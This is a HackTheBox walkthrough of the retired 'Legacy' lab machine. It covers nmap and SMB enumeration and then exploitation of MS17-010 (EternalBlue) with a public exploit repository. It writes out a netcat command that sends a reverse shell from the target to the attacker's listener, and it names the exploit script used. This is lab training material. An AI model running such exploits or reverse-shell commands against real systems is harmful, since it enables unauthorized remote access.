---
title: Legacy - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-20 12:00:00 
categories: [HackTheBox,Windows]
tags: [smb,ms17-010]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Legacy/00-banner.png
  width: 590
  height: 364
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Legacy` a retired windows machine from HackTheBox rated easy. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we'll start with a nmap scan to discover the open ports and services.

```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Tue Oct 19 19:13:45 2021 as: nmap -sC -sV -v -oN nmap-scan -Pn 10.129.239.226
Nmap scan report for 10.129.239.226
Host is up (0.13s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s
| nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c3:a2 (VMware)
| Names:
|_
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-10-25T05:11:43+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 19 19:14:55 2021 -- 1 IP address (1 host up) scanned in 69.95 seconds
```
## Smb Enumeration
It seems the vector attack will be through smb, I used `nmap` to test if ther any vulnerability in this service.

![01-smb.png](/assets/img/HTB/Legacy/01-smb.png)

And it show us it is vulnerable to `CVE-2008-4250` and `CVE-2017-0143` this time I chose use CVE-2017-0143.

# Exploitation
This vulnerability is called `Eternal Blue` which is an exploit that allows attacker to remotely execute arbitrary code and gain access to a network by sending specially crafted packets.

To exploit it, just need clone this [repository](https://github.com/3ndG4me/AutoBlue-MS17-010).
```console
$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010
```
And run `zzz_exploit.py` like the screenshot below.

![02-eternalblue.png](/assets/img/HTB/Legacy/02-eternalblue.png)

`whoami` doesn't work but we have this executable on our machine.

![03-whoami.png](/assets/img/HTB/Legacy/03-whoami.png)

Share this directory using `smbserver.py`.

![04-smbserver.png](/assets/img/HTB/Legacy/04-smbserver.png)

Once we created a share folder just execute whoami.exe

![05-whoami.png](/assets/img/HTB/Legacy/05-whoami.png)

Also we can use `nc.exe` to send a reverse shell to our netcat listener port.
```console
$ \\10.10.14.75\Folder\nc.exe -e cmd 10.10.14.75 443
```
![06-nc.png](/assets/img/HTB/Legacy/06-nc.png)

Just change the directory to `C:\Documents and Settings` where are located the home directories of Administrator and John.

![07-root.png](/assets/img/HTB/Legacy/07-root.png)

We got root.txt
That’s it for now guys. Until next time.

# Resources
- https://www.cisecurity.org/wp-content/uploads/2019/01/Security-Primer-EternalBlue.pdf
- https://github.com/3ndG4me/AutoBlue-MS17-010
